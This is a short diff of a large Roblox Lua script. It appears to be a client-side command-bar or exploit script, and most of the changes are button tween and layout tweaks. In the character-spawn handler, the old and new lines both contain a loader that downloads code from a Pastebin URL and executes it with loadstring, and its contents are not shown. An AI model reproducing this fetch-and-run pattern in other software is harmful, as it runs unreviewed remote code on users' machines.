@@ -15248,7 +15248,7 @@ end
  
  wait(0.2)
  
- -- [[ COMMAND BAR BUTTON ]] --
+ -- [[ COMMAND BAR BUTTON ]]
  local ScreenGui = Instance.new("ScreenGui")
  local TextClickButton = Instance.new("TextButton")
  local UICorner = Instance.new("UICorner")
@@ -15285,12 +15285,11 @@ end
 	 textclickbutton:TweenSize(UDim2.new(0, 500, 0, 150), "Out", "Quint",5,true)
 	 wait(4)
 	 textclickbutton:TweenSize(UDim2.new(0, 32, 0, 33), "Out", "Quint",1,true)
-	 textclickbutton:TweenPosition(UDim2.new(0.94, 0, -0.0535, 0), "Out", "Quint",1,true)
+	 textclickbutton:TweenPosition(UDim2.new(0.965, 0, 0.015, 0), "Out", "Quint",1,true)
      wait(0.4)
      TextClickButton.TextScaled = true
      wait(0.3)
      TextClickButton.BackgroundTransparency = 0.5
-     textclickbutton:TweenSize(UDim2.new(0, 32, 0, 33), "Out", "Quint",1,true)
      TextClickButton.TextScaled = false
      TextClickButton.TextSize = 17.000
      TextClickButton.TextWrapped = false
@@ -15668,8 +15667,8 @@ local function onCharacterAdded(character)
 			game.Players.LocalPlayer.Character.Humanoid.JumpHeight = 8
 	    end
 	end
-        wait(1)
-        loadstring(game:HttpGet("https://pastebin.com/raw/ZvL4ptJi"))()
+
+    loadstring(game:HttpGet("https://pastebin.com/raw/ZvL4ptJi"))()
 end
 if player.Character and player.Character:FindFirstChild("Humanoid") then
     local humanoid = player.Character.Humanoid
